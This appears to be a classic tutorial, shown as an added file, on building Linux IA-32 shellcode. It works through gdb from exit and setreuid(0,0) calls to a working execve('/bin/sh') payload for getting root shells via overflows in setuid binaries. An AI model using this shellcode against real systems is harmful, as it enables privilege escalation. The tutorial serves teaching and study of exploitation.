@@ -1,0 +1,669 @@
+
+
+		DESIGNING SHELLCODE DEMYSTIFIED
+
+			      by
+		  murat at enderunix dot org
+
+
+	In our previous paper, Buffer Overflows Demystified, we told you that
+there will be more papers on these subjects. We kept our promise. Here is the
+second paper from the same series. The paper is about the fundamentals of 
+shellcode design and totally Linux 2.2 on IA-32 specifig. The base principles
+apply to all architectures, whereas the details might obviously not.
+
+
+	To understand what's going on, some C and assembly knowledge is 
+required. Virtual Memory, some Operating Systems essentials, like, for 
+example, how a process is laid out in memory will be helpful. You MUST know
+what a setuid binary is, and of course you need to be able to -at least-
+use UNIX systems. If you have an experince of gdb/cc, that is something 
+really really good. Keep  "IA-32 Intel® Architecture Software Developer's 
+Manual Volume 1: Basic Architecture" at hand. You can get it from:
+	ftp://download.intel.com/design/Pentium4/manuals/24547008.pdf
+
+
+Recent versions of the paper can be found here:
+	http://www.enderunix.org/documents/en/sc-en.txt
+
+
+			WHAT'S SHELLCODE?
+	In our previous paper, i told several times that, once we get control
+over the execution of the target program, we can run anycode we want, let's
+remember:
+
+	"strcpy() copied large_one to foo, without bounds checking, filling 
+         the whole stack with A, starting from the beginning of foo1, EBP-16. 
+
+	 Now that we could overwrite the return address, if we put the address 
+	 of some other memory segment, can we execute the instructions there? 
+	 The answer is yes.
+
+	 Assume that we place some /bin/sh spawning instructions on some memory
+	 address, and we put that address on the function's return address that 
+	 we overflow, we can spawn a shell, and most probably, we will spawn a 
+	 rootshell, since you'll be already interested with setuid 
+	 binaries." [5]
+
+
+Again, if you would recall, the instructions the CPU will likely to run are 
+placed in some portion of memory. What we simply do is to place our code 
+somewhere in the memory and make EIP point to it.
+
+We name these assembly instructions "the shellcode". To use it within an 
+exploit, we put their hexadecimal opcodes in a character array.
+
+Several methods are available to get those instructions:
+	1. Write directly in hexcode
+	2. Write the assembly instructions, then extract the opcodes
+	3. Write in C, extract assembly instructions and then opcodes
+
+We'll first use the third method and try to run some system calls like exit.
+Soon, we'll write a shellcode to spawn a new shell.
+
+The code we'd like to run will usually be the execution of a system program, 
+e.g.  spawning a root shell or binding a root shell to a newly created socket 
+if it'll run remotely. When we talk about "executing a program", we mean
+"calling a kernel service which will be responsible for creating and executing
+a new system process". These services run in the most privileged CPU mode,
+namely kernel mode. We'll need an entry to the kernel for these sort of servi-
+ces.  These services are available to userspace programs via system calls. 
+Thus, to understand what's all about shellcode, we'll first need to dive into 
+system calls.
+
+
+
+			SYSTEM CALLS
+
+Entrances into the kernel can be categorized according to the event or action
+that initiates it:
+
+	1. Hardware Interrupt
+	2. Hardware trap
+	3. Software initiated trap
+
+Hardware interrupts arise from external events, such as an I/O device needing
+attention or a clock reporting passage of time. Hardware interrupts occur
+asynchronously and may not relate to the context of the currently executing
+process. 
+
+Hardware traps may be either synchronous or asynchronous, but are related to
+the current executing process. Examples of hardware traps are those generated
+as a result of an illegal arithmetic operation, such as divide by zero.
+
+
+Software initiated traps are used by system to force the scheduling of an event
+such as process rescheduling or network processing, as soon as possible. System
+calls are a special case of a software initiated trap -the machine instruction
+used to initiate a system call typically causes a hardware trap that is handled
+specially by the kernel.  The most frequent trap into the kernel (after clock 
+processing) is a request to do a system call. The system call handler must do
+the following work:
+
+1. Verify that the parameters to the system call are located at a valid user
+   address and copy them from the user's address space into the kernel
+
+2. Call a kernel routine that implements the system call [2]
+							
+
+There are two mechanism under Linux for implementing system calls:
+	1. lcall7/lcall27 gates
+	2. INT 0x80 software interrupt
+
+Native Linux programs use int 0x80 whilst binaries from foreign flavors of UNIX
+(Solaris, UnixWare 7 etc.) use the lcall7 mechanism. The name "lcall7" is his-
+torically misleading because it also covers lcall27 (e.g. Solaris/x86), but the
+handler function is called lcall7_func.
+
+When the system boots, the function arch/i386/kernel/traps.c:trap_init() is
+called which sets up the IDT (Interrupt Descriptor Table) so that vector 0x80
+(of type 15, dpl 3) points to the address of system_call entry from 
+arch/i386/kernel/entry.S.
+
+When a userspace application makes a system call, the arguments are passed via
+registers and the application executes 'int 0x80' instruction. This causes a 
+trap into kernel mode and processor jumps to system_call entry point in entry.S.
+What this generally does is:
+
+1. Save registers
+2. Conduct some sanity checking
+3. Call the particular system_call handler function to handle the system call.
+[3]
+
+EAX register denotes the specific system call. Other registers have relative
+meanings according to the value in EAX register.
+
+To give an example, let us assume that a process requested _exit. Before 
+going into kernel mode, the underlying library functions set EAX to 0x1
+which denotes sys_exit, set EBX the parameter given to exit() and executes
+int 0x80. When the trap occurs, kernel locates the appropriate handler routine.
+In this scenario, since EAX is 0x1, kernel/exit.c:sys_exit is executed. 
+This function operates according to the value that is present in EBX register.
+
+Now that we've gone through the mechanisms involved in system calls and how
+they actually work, we can start invoking them from our assembly instructions.
+Once we get the instructions, we'll find the hexadecimal opcode for them, 
+put them in an array and create our shellcode.
+
+
+				EXIT SHELLCODE
+
+Let's first code in C, and see for ourselves:
+
+$ export CFLAGS=-g
+
+----------------------- c-exit.c ------------------------------
+#include <stdlib.h>
+
+main()
+{
+        exit(0);
+}
+----------------------- c-exit.c ------------------------------
+
+$ make c-exit
+cc -g    c-exit.c   -o c-exit
+$ gdb ./c-exit
+(gdb) b main
+Breakpoint 1 at 0x80483b7: file c-exit.c, line 5.
+(gdb) r
+Starting program: /home/balaban/sc/./c-exit
+warning: Unable to find dynamic linker breakpoint function.
+GDB will be unable to debug shared library initializers
+and track explicitly loaded dynamic code.
+
+Breakpoint 1, main () at c-exit.c:5
+5               exit(128);
+(gdb) disas _exit
+Dump of assembler code for function _exit:
+0x400a5ee0 <_exit>:     mov    %ebx,%edx
+0x400a5ee2 <_exit+2>:   mov    0x4(%esp,1),%ebx
+0x400a5ee6 <_exit+6>:   mov    $0x1,%eax
+0x400a5eeb <_exit+11>:  int    $0x80
+--kesildi---
+
+End of assembler dump.
+(gdb)
+
+As you can see above, standart library function exit sets EAX to 0x1
+and EBX to the parameter pushed onto the stack(parameter to the function,
+which is the actual exit status).
+
+So, here are the instructions for exit(0):
+	XOR	%EBX, %EBX	/* return code for exit(), set EBX zero.*/
+	MOV	$0x1, %EAX	/* sys_exit				*/
+	INT	0x80		/* Generate trap			*/
+
+A user-friendly version of Linux System Call table can be found in the
+following link:
+	http://world.std.com/~slanning/asm/syscall_list.html
+
+sys_exit is defined as such:
+
+%eax	Name		Source		%ebx	%ecx	%edx	%esx	%edi
+1	sys_exit	kernel/exit.c	int	-	-	-	-
+
+
+We can write the instructions inline in a C function:
+
+----------------------- a-exit.c ------------------------------
+main()
+{
+        __asm__("
+                xorl %ebx, %ebx
+                mov $0x1, %eax
+                int $0x80
+        ");
+
+
+}
+----------------------- a-exit.c ------------------------------
+
+We can trace the system calls within a program's execution time with
+strace:
+
+$ strace ./a-exit
+execve("./a-exit", ["./a-exit"], [/* 32 vars */]) = 0
+brk(0)                                  = 0x80494d8
+
+--- snipped ---
+
+_exit(0)                                = ?
+$
+
+As you can see, exit(0) has been executed!
+
+We can move onto another sytem call:
+	setreuid(0, 0)
+
+Sometimes we may be in need of some "privilege restoration routines" which
+restore a given process' root privileges whenever they are processed by it 
+but are temporarily unavailable because of some security reasons. These
+routines are especially useful for exploiting vulnerabilities in certain 
+setuid binaries, the ones that revert but do not completely drop their ele-
+vated privileges. setreuid is one of them, and sets the process' real and
+effective user ids. [4]
+
+From the above given URI, you can get some information about this system
+call:
+
+%eax	Name		Source		%ebx	%ecx	%edx	%esx	%edi
+70	sys_setreuid	kernel/sys.c	uid_t	uid_t	-	-	-
+
+Same principles apply here. We set EAX 0x46 which is sys_setreuid's value, 
+EBX to the real userid and ECX to the effective userid.
+
+----------------------- a-setreuid.c ------------------------------
+
+main()
+{
+        __asm__("
+                xorl %ebx, %ebx
+                xorl %ecx, %ecx
+                mov $0x46, %eax
+                int $0x80
+                xorl %ebx, %ebx
+                mov $0x1, %eax
+                int $0x80
+        ");
+
+}
+
+
+----------------------- a-setreuid.c ------------------------------
+
+xorl %ebx, %ebx
+	Set EBX register 0. If you XOR some number with itself, you get zero.
+	Remeber that EBX is the real userid part.
+
+xorl %ecx, %ecx
+	ECX = effective userid = 0
+
+mov $0x46, %eax
+	EAX = 0x46.
+
+int $0x80
+	Dive into kernel mode.
+
+Other instructions after this are the ones for exit(0);
+
+$ make a-setreuid
+cc     a-setreuid.c   -o a-setreuid
+$ su
+# strace ./a-setreuid
+execve("./a-setreuid", ["./a-setreuid"], [/* 31 vars */]) = 0
+brk(0)                                  = 0x80494e4
+
+---- snipped ----
+
+setreuid(0, 0)                          = 0
+_exit(0)                                = ?
+#
+
+As you can see, first setreuid(0, 0) and then exit(0) has been
+executed. It's time we extract the opcode for these instructions.
+In GDB, x/bx command shows one byte unit from memory we specify.
+This is what we want. For a detailed walkthrough on x/bx, you can
+have a look at:
+http://www.gnu.org/manual/gdb-4.17/html_chapter/gdb_9.html#SEC56
+
+$ gdb ./a-setreuid
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048380 <main>:       push   %ebp
+0x8048381 <main+1>:     mov    %esp,%ebp
+0x8048383 <main+3>:     xor    %ebx,%ebx
+0x8048385 <main+5>:     xor    %ecx,%ecx
+0x8048387 <main+7>:     mov    $0x46,%eax
+0x804838c <main+12>:    int    $0x80
+0x804838e <main+14>:    xor    %ebx,%ebx
+0x8048390 <main+16>:    mov    $0x1,%eax
+0x8048395 <main+21>:    int    $0x80
+0x8048397 <main+23>:    leave
+0x8048398 <main+24>:    ret
+End of assembler dump.
+(gdb) x/bx main+3
+0x8048383 <main+3>:     0x31
+(gdb) x/bx main+4
+0x8048384 <main+4>:     0xdb
+(gdb) x/bx main+5
+0x8048385 <main+5>:     0x31
+(gdb) x/bx main+6
+0x8048386 <main+6>:     0xc9
+(gdb) x/bx main+7
+0x8048387 <main+7>:     0xb8
+(gdb) x/bx main+8
+0x8048388 <main+8>:     0x46
+(gdb) x/bx main+9
+0x8048389 <main+9>:     0x00
+(gdb) x/bx main+10
+0x804838a <main+10>:    0x00
+(gdb) x/bx main+11
+0x804838b <main+11>:    0x00
+(gdb) x/bx main+12
+0x804838c <main+12>:    0xcd
+(gdb) x/bx main+13
+0x804838d <main+13>:    0x80
+(gdb) x/bx main+14
+0x804838e <main+14>:    0x31
+(gdb) x/bx main+15
+0x804838f <main+15>:    0xdb
+(gdb) x/bx main+16
+0x8048390 <main+16>:    0xb8
+(gdb) x/bx main+17
+0x8048391 <main+17>:    0x01
+(gdb) x/bx main+18
+0x8048392 <main+18>:    0x00
+(gdb) x/bx main+19
+0x8048393 <main+19>:    0x00
+(gdb) x/bx main+20
+0x8048394 <main+20>:    0x00
+(gdb) x/bx main+21
+0x8048395 <main+21>:    0xcd
+(gdb) x/bx main+22
+0x8048396 <main+22>:    0x80
+(gdb)
+
+Our shellcode:
+----------------------- s-setreuid.c ------------------------------
+char sc[] = "\x31\xdb"                  /* xor %ebx, %ebx       */
+            "\x31\xc9"                  /* xor %ecx, %ecx       */
+            "\xb8\x46\x00\x00\x00"      /* mov $0x46, %eax      */
+            "\xcd\x80"                  /* int $0x80            */
+            "\x31\xdb"                  /* xor %ebx, %ebx       */
+            "\xb8\x01\x00\x00\x00"      /* mov $0x1, %eax       */
+            "\xcd\x80";                 /* int $0x80            */
+
+
+main()
+{
+        void (*fp) (void);
+
+        fp = (void *)sc;
+        fp();
+}
+----------------------- s-setreuid.c ------------------------------
+
+$ su
+# make s-setreuid
+cc     s-setreuid.c   -o s-setreuid
+# strace ./s-setreuid
+execve("./s-setreuid", ["./s-setreuid"], [/* 31 vars */]) = 0
+brk(0)                                  = 0x80494f8
+
+---- snipped 
+
+setreuid(0, 0)                          = 0
+_exit(0)                                = ?
+#
+
+As seen, the same effect with the shellcode.
+
+
+			SHELL SPAWNING SHELLCODE 
+	
+	This is the sweetest part. Basing what we've learnt so far, lets try
+coding a shellcode which spawns an interactive shell. The first thing we should
+do is to analyze execve system call a little bit in detail. Go to the URI I've
+given above and get some idea: 
+	
+%eax Name	 Source		            %ebx           %ecx %edx  %esx  %edi
+11   sys_execve  arch/i386/kernel/process.c struct pt_regs  -     -     -     - 	
+
+EBX has the address of pt_regs structure. Not much explanatory. The handler is
+in arch'i386/kernel/process.c. Let's see it:
+
+/*
+ * sys_execve() executes a new program.
+ */
+asmlinkage int sys_execve(struct pt_regs regs)
+{
+        int error;
+        char * filename;
+
+        filename = getname((char *) regs.ebx);
+        error = PTR_ERR(filename);
+        if (IS_ERR(filename))
+                goto out;
+        error = do_execve(filename, (char **) regs.ecx, (char **) regs.edx, &regs);
+        if (error == 0)
+                current->ptrace &= ~PT_DTRACE;
+        putname(filename);
+out:
+        return error;
+}
+
+As you'd notice, EBX register has the address of the command, which, in this
+scenario, is the address of string "/bin/sh". We cannot get any more clue as 
+to what ECX and EDX do. However look, the routine calls another function, 
+do_execve and passes these addresses to that. To understand what these
+really are, we need to go further:
+
+From fs/exec.c:
+
+int do_execve(char * filename, char ** argv, char ** envp, struct pt_regs * regs)
+
+Here, it's obvious that ECX has the address of argv[] and EDX has the address
+of env[].  They are pointers to character arrays. Environment variables can be
+set to NULL, which means we can have a zero in EDX, however, we need to supply
+argv[0] the name of the program at least. Since argv[] will be NULL terminated,
+argv[1] will be zero also.
+
+So we'll need to:
+	* have the string "/bin/sh" somewhere in memory
+	* write the address of that into EBX
+	* create a char ** which holds the address of the former "/bin/sh"
+	  and the address of a NULL.	
+	* write the address of that char ** into ECX.
+	* write zero into EDX.
+	* issue int 0x80 and generate the trap.
+
+Let's start typing:
+
+First write a NULL terminated "/bin/sh" into memory. We can do this by pushing
+a NULL and an adjacent "/bin/sh" into stack:
+
+create a NULL in EAX. This will be used for terminating the string:
+        xorl  %eax, %eax       
+
+push that zero (null) into stack:
+        pushl %eax            
+
+push "//sh":
+        pushl $0x68732f2f     
+
+push "/bin":
+        pushl $0x6e69622f     
+
+At this moment, ESP points at the starting address of "/bin/sh". We can safely
+write this into EBX:
+        movl  %esp, %ebx      
+
+EAX is still zero. We can use this to terminate char **argv:
+        pushl %eax            
+
+If we push the address of "/bin/sh" into stack too, the address of the pointer
+to character array argv will be at ESP. In this way, we have created the 
+char **argv in the memory:
+        pushl %ebx            
+
+And write the address of argv into ECX:
+        movl  %esp, %ecx      
+
+EDX may happily be zero.
+        xorl  %edx, %edx      
+
+sys_execve = 0xb. That should be in EAX:
+        movb  $0xb, %al       
+
+Trigger the interrupt and enter kernel mode:
+        int   $0x80           
+
+
+----------------------- sc.c ------------------------------
+
+main()
+{
+        __asm__("
+	        xorl  %eax,%eax
+       		pushl %eax
+        	pushl $0x68732f2f
+        	pushl $0x6e69622f
+        	movl  %esp, %ebx
+        	pushl %eax
+        	pushl %ebx
+        	movl  %esp, %ecx
+        	xorl  %edx, %edx
+        	movb  $0xb, %eax
+        	int $0x80"
+        );
+}
+
+----------------------- sc.c ------------------------------
+
+$ make sc
+cc -g    sc.c   -o sc
+$ ./sc
+sh-2.04$
+
+It works. Let's find the opcode line by line and construct our shellcode:
+
+$ gdb ./sc
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048380 <main>:       push   %ebp
+0x8048381 <main+1>:     mov    %esp,%ebp
+0x8048383 <main+3>:     xor    %eax,%eax
+0x8048385 <main+5>:     push   %eax
+0x8048386 <main+6>:     push   $0x68732f2f
+0x804838b <main+11>:    push   $0x6e69622f
+0x8048390 <main+16>:    mov    %esp,%ebx
+0x8048392 <main+18>:    push   %eax
+0x8048393 <main+19>:    push   %ebx
+0x8048394 <main+20>:    mov    %esp,%ecx
+0x8048396 <main+22>:    xor    %edx,%edx
+0x8048398 <main+24>:    mov    $0xb,%al
+0x804839a <main+26>:    int    $0x80
+0x804839c <main+28>:    leave
+0x804839d <main+29>:    ret
+End of assembler dump.
+(gdb) x/bx main+3
+0x8048383 <main+3>:     0x31
+(gdb) x/bx main+4
+0x8048384 <main+4>:     0xc0
+(gdb)
+0x8048385 <main+5>:     0x50
+(gdb)
+0x8048386 <main+6>:     0x68
+(gdb)
+0x8048387 <main+7>:     0x2f
+(gdb)
+0x8048388 <main+8>:     0x2f
+(gdb)
+0x8048389 <main+9>:     0x73
+(gdb)
+0x804838a <main+10>:    0x68
+(gdb)
+0x804838b <main+11>:    0x68
+(gdb)
+0x804838c <main+12>:    0x2f
+(gdb)
+0x804838d <main+13>:    0x62
+(gdb)
+0x804838e <main+14>:    0x69
+(gdb)
+0x804838f <main+15>:    0x6e
+(gdb)
+0x8048390 <main+16>:    0x89
+(gdb)
+0x8048391 <main+17>:    0xe3
+(gdb)
+0x8048392 <main+18>:    0x50
+(gdb)
+0x8048393 <main+19>:    0x53
+(gdb)
+0x8048394 <main+20>:    0x89
+(gdb)
+0x8048395 <main+21>:    0xe1
+(gdb)
+0x8048396 <main+22>:    0x31
+(gdb)
+0x8048397 <main+23>:    0xd2
+(gdb)
+0x8048398 <main+24>:    0xb0
+(gdb)
+0x8048399 <main+25>:    0x0b
+(gdb)
+0x804839a <main+26>:    0xcd
+(gdb)
+0x804839b <main+27>:    0x80
+(gdb)
+
+
+----------------------- sc.c ------------------------------
+
+char sc[] =
+        "\x31\xc0"              /* xor %eax, %eax       */
+        "\x50"                  /* push %eax            */
+        "\x68\x2f\x2f\x73\x68"  /* push $0x68732f2f     */
+        "\x68\x2f\x62\x69\x6e"  /* push $0x6e69622f     */
+        "\x89\xe3"              /* mov  %esp,%ebx       */
+        "\x50"                  /* push %eax            */
+        "\x53"                  /* push %ebx            */
+        "\x89\xe1"              /* mov  %esp,%ecx       */
+        "\x31\xd2"              /* xor  %edx,%edx       */
+        "\xb0\x0b"              /* mov  $0xb,%al        */
+        "\xcd\x80";             /* int  $0x80           */
+
+main()
+{
+        void (*fp) (void);
+
+        fp = (void *)sc;
+        fp();
+}
+
+
+----------------------- sc.c ------------------------------
+
+$ make s-sc
+cc -g    s-sc.c   -o s-sc
+$ ./s-sc
+sh-2.04$
+
+
+
+
+			LAST WORDS
+Using the afore mentioned logic, one can construct millions of fantastic
+shellcode. What is necessary is a little bit attention.
+
+
+- Murat Balaban
+  murat at enderunix dot org
+
+
+			GREETINGS
+a, da, aleph1, lsd-pl guys, Mr. Brown, cronos,  gargoyle, matsuri
+
+
+Bibliography:
+
+[1] Linux Kernel Internals
+    Beck M et al, Addison Wesley, (1997) 2nd edition.
+
+[2] The Design and Implementation of the 4.4BSD Operating System
+    McKusick M et al, Addison Wesley, 1996.
+
+[3] IA-32 Intel® Architecture Software Developer's Manuals
+    http://www.intel.com/design/pentium4/manuals/
+
+[4] Unix Assembly Codes Development For Vulnerabilities Illustration Purposes
+    http://lsd-pl.net/documents/asmcodes-1.0.2.pdf
+
+[5] Buffer Overflows Demystified
+    http://www.enderunix.org/docs/eng/bof-eng.txt
+
+[6] Linux 2.2 Kernel Sources
+    http://www.kernel.org/pub/linux/kernel/v2.2/
+
